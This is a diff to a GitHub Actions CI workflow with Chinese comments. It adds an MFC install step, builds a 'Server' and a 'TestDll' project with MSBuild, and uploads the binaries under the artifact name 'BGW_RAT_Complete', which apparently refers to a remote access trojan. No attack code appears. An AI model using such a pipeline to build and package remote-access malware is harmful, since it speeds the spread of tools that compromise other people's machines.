@@ -14,19 +14,24 @@ jobs:
       - name: Setup MSBuild
         uses: microsoft/setup-msbuild@v2
         
-      - name: Build All Projects in Server
+      - name: Install MFC (解决 afxwin.h)
         shell: pwsh
         run: |
-          $projects = Get-ChildItem -Path "${{ github.workspace }}\Server" -Filter *.vcxproj
-          foreach ($proj in $projects) {
-            Write-Host "正在构建全部功能项目: $($proj.Name)"
-            msbuild $proj.FullName /p:Configuration=Release /p:Platform=x64 /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS" /m
-          }
-          
-      - name: Upload All EXE and DLL
+          $installerPath = "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vs_installer.exe"
+          $vsPath = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise"
+          Start-Process -FilePath $installerPath -ArgumentList "modify", "--installPath", $vsPath, "--add", "Microsoft.VisualStudio.Component.VC.ATLMFC", "--passive", "--norestart" -Wait
+          Write-Host "MFC安装完成，继续编译。"
+
+      - name: Build All Projects (完整功能)
+        shell: cmd
+        run: |
+          msbuild "${{ github.workspace }}\Server\Server.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS" /m
+          msbuild "${{ github.workspace }}\Server\TestDll.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS" /m
+
+      - name: Upload All EXE and DLL (打包全部功能)
         uses: actions/upload-artifact@v4
         with:
-          name: BGW_RAT_All_Functions
+          name: BGW_RAT_Complete
           path: |
             Server\**\*.exe
             Server\**\*.dll
